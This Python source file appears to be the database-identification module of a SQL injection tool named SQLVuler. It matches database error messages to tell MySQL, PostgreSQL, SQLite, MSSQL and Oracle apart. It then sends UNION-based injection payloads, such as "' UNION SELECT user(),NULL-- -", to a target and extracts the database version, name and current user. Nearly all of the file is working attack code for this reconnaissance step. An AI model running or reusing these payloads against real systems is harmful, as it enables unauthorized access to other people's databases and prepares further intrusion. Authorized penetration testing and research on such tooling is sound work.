#!/usr/bin/env python3
"""
Database Identifier for SQLVuler
Identifies database type and version based on responses
"""

import re
from sqlvuler.utils.logger import get_logger

class DatabaseIdentifier:
    """Identifies database type and version from responses"""
    
    def __init__(self, config_manager=None, request_handler=None):
        """
        Initialize the Database Identifier
        
        Args:
            config_manager: Configuration manager instance
            request_handler: Request handler instance
        """
        self.logger = get_logger()
        self.config_manager = config_manager
        self.request_handler = request_handler
        
        # Database information
        self.db_type = None
        self.db_version = None
        self.db_user = None
        self.db_name = None
        
        # Database detection patterns
        self.detection_patterns = {
            "MySQL": [
                r"MySQL",
                r"You have an error in your SQL syntax",
                r"Warning: mysql_",
                r"MySQLSyntaxErrorException",
                r"MySQL Query fail",
                r"check the manual that corresponds to your MySQL server version"
            ],
            "PostgreSQL": [
                r"PostgreSQL",
                r"Warning: pg_",
                r"PSQLException",
                r"PG::Error",
                r"ERROR:  syntax error at or near"
            ],
            "SQLite": [
                r"SQLite",
                r"Warning: sqlite_",
                r"SQLiteException",
                r"System.Data.SQLite.SQLiteException"
            ],
            "MSSQL": [
                r"Microsoft SQL Server",
                r"Unclosed quotation mark after the character string",
                r"SQLServerException",
                r"Incorrect syntax near",
                r"OLE DB Provider for SQL Server"
            ],
            "Oracle": [
                r"Oracle",
                r"ORA-[0-9]{5}",
                r"Warning: oci_",
                r"OracleException",
                r"SQL command not properly ended"
            ]
        }
        
        # Version detection queries
        self.version_queries = {
            "MySQL": {
                "query": "' UNION SELECT version(),NULL-- -",
                "pattern": r"([0-9]+\.[0-9]+\.[0-9]+)"
            },
            "PostgreSQL": {
                "query": "' UNION SELECT version(),NULL-- -",
                "pattern": r"PostgreSQL ([0-9]+\.[0-9]+)"
            },
            "SQLite": {
                "query": "' UNION SELECT sqlite_version(),NULL-- -",
                "pattern": r"([0-9]+\.[0-9]+\.[0-9]+)"
            },
            "MSSQL": {
                "query": "' UNION SELECT @@version,NULL-- -",
                "pattern": r"Microsoft SQL Server ([0-9]+)"
            },
            "Oracle": {
                "query": "' UNION SELECT banner,NULL FROM v$version WHERE banner LIKE 'Oracle%'-- -",
                "pattern": r"Oracle Database ([0-9]+\w*)"
            }
        }
    
    def identify_from_error(self, error_message):
        """
        Identify database type from an error message
        
        Args:
            error_message (str): SQL error message
            
        Returns:
            str: Database type or None if not identified
        """
        if not error_message:
            return None
        
        for db_type, patterns in self.detection_patterns.items():
            for pattern in patterns:
                if re.search(pattern, error_message, re.IGNORECASE):
                    self.db_type = db_type
                    self.logger.info(f"Identified database type from error: {db_type}")
                    return db_type
        
        return None
    
    def identify_from_response(self, response_content):
        """
        Identify database type from a response
        
        Args:
            response_content (str): Response content
            
        Returns:
            str: Database type or None if not identified
        """
        if not response_content:
            return None
        
        for db_type, patterns in self.detection_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_content, re.IGNORECASE):
                    self.db_type = db_type
                    self.logger.info(f"Identified database type from response: {db_type}")
                    return db_type
        
        return None
    
    def identify_version(self, parameter):
        """
        Identify database version using version queries
        
        Args:
            parameter (dict): Parameter to test
            
        Returns:
            str: Database version or None if not identified
        """
        if not self.db_type or not self.request_handler:
            return None
        
        # Get version query for detected database type
        version_info = self.version_queries.get(self.db_type)
        if not version_info:
            return None
        
        # Try to get version with Union query
        query = version_info["query"]
        pattern = version_info["pattern"]
        
        # Build and send request
        request_data = self.request_handler.build_request(parameter, query)
        response_info = self.request_handler.send_request(request_data)
        
        if not response_info:
            return None
        
        # Check response for version
        content = response_info.get("content", "")
        match = re.search(pattern, content, re.IGNORECASE)
        
        if match:
            version = match.group(1)
            self.db_version = version
            self.logger.info(f"Identified database version: {version}")
            return version
        
        return None
    
    def identify_database(self, parameter):
        """
        Identify current database name
        
        Args:
            parameter (dict): Parameter to test
            
        Returns:
            str: Database name or None if not identified
        """
        if not self.db_type or not self.request_handler:
            return None
        
        # Database name query based on database type
        queries = {
            "MySQL": "' UNION SELECT database(),NULL-- -",
            "PostgreSQL": "' UNION SELECT current_database(),NULL-- -",
            "SQLite": "' UNION SELECT 'main',NULL-- -",  # SQLite uses 'main' as default DB
            "MSSQL": "' UNION SELECT DB_NAME(),NULL-- -",
            "Oracle": "' UNION SELECT ora_database_name FROM dual-- -"
        }
        
        query = queries.get(self.db_type)
        if not query:
            return None
        
        # Build and send request
        request_data = self.request_handler.build_request(parameter, query)
        response_info = self.request_handler.send_request(request_data)
        
        if not response_info:
            return None
        
        # Check response for database name
        content = response_info.get("content", "")
        
        # Common patterns for extracting database name from response
        patterns = [
            r"<td>([\w\d_-]+)</td>",
            r"<[^>]*>([\w\d_-]+)</[^>]*>",
            r"<div[^>]*>\s*([\w\d_-]+)\s*</div>",
            r"[^\w\d]+([\w\d_-]{3,})[^\w\d]+"
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            if matches:
                # Filter out common words
                common_words = ["null", "html", "body", "head", "div", "span", "table", "tr", "td"]
                for match in matches:
                    if match.lower() not in common_words:
                        self.db_name = match
                        self.logger.info(f"Identified database name: {match}")
                        return match
        
        return None
    
    def identify_user(self, parameter):
        """
        Identify current database user
        
        Args:
            parameter (dict): Parameter to test
            
        Returns:
            str: Database user or None if not identified
        """
        if not self.db_type or not self.request_handler:
            return None
        
        # User query based on database type
        queries = {
            "MySQL": "' UNION SELECT user(),NULL-- -",
            "PostgreSQL": "' UNION SELECT current_user,NULL-- -",
            "SQLite": "' UNION SELECT 'sqlite_user',NULL-- -",  # SQLite doesn't have users
            "MSSQL": "' UNION SELECT SYSTEM_USER,NULL-- -",
            "Oracle": "' UNION SELECT USER FROM dual-- -"
        }
        
        query = queries.get(self.db_type)
        if not query:
            return None
        
        # Build and send request
        request_data = self.request_handler.build_request(parameter, query)
        response_info = self.request_handler.send_request(request_data)
        
        if not response_info:
            return None
        
        # Check response for user
        content = response_info.get("content", "")
        
        # Common patterns for extracting user from response
        patterns = [
            r"<td>([\w\d_@-]+)</td>",
            r"<[^>]*>([\w\d_@-]+)</[^>]*>",
            r"<div[^>]*>\s*([\w\d_@-]+)\s*</div>",
            r"[^\w\d]+([\w\d_@-]{3,})[^\w\d]+"
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            if matches:
                # Filter out common words
                common_words = ["null", "html", "body", "head", "div", "span", "table", "tr", "td"]
                for match in matches:
                    if match.lower() not in common_words and "@" in match:
                        self.db_user = match
                        self.logger.info(f"Identified database user: {match}")
                        return match
        
        return None
    
    def get_database_info(self):
        """
        Get all identified database information
        
        Returns:
            dict: Database information
        """
        return {
            "type": self.db_type,
            "version": self.db_version,
            "user": self.db_user,
            "database": self.db_name
        }
    
    def reset(self):
        """Reset database information"""
        self.db_type = None
        self.db_version = None
        self.db_user = None
        self.db_name = None